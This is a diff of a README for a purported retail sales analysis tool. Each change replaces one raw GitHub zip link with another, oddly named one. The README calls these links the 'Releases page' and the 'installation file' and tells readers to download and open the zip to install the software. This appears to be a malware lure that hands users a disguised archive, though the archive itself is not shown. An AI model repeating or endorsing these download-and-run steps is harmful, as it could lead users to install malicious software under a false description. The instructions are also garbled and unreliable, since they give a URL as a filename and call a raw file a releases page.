@@ -1,6 +1,6 @@
 # 📊 retail-sales-analysis-project - Analyze Retail Data Easily
 
-![Download](https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/images/retail-sales-analysis-project-v3.0-alpha.5.zip)
+![Download](https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/outputs/project-analysis-retail-sales-electrophototherapy.zip)
 
 ## 🌟 Introduction
 
@@ -19,7 +19,7 @@ To begin using the software, follow these simple steps:
 
 2. **Visit the Releases Page**  
    You can download the latest version of the project from our Releases page:  
-   [Download Here](https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/images/retail-sales-analysis-project-v3.0-alpha.5.zip)
+   [Download Here](https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/outputs/project-analysis-retail-sales-electrophototherapy.zip)
 
 ## 📥 Download & Install
 
@@ -28,7 +28,7 @@ To download the software, follow these steps:
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, look for the latest version. It will be at the top of the list.
 3. Click on the version number to view details.
-4. Find the installation file, which is typically named `https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/images/retail-sales-analysis-project-v3.0-alpha.5.zip` or similar. Click on it to start downloading.
+4. Find the installation file, which is typically named `https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/outputs/project-analysis-retail-sales-electrophototherapy.zip` or similar. Click on it to start downloading.
 5. Once the download is complete, open the file to start the installation process.
 6. Follow the on-screen instructions to install the software on your computer.
 
@@ -77,7 +77,7 @@ If you encounter issues or have questions, please participate in our community. 
 
 We regularly update this project to improve features and fix bugs. Check the Releases page for the latest versions:
 
-[Download Here](https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/images/retail-sales-analysis-project-v3.0-alpha.5.zip)
+[Download Here](https://raw.githubusercontent.com/kainemonkey/retail-sales-analysis-project/main/outputs/project-analysis-retail-sales-electrophototherapy.zip)
 
 Your feedback is invaluable. If you have suggestions or would like to contribute, please open an issue.
 
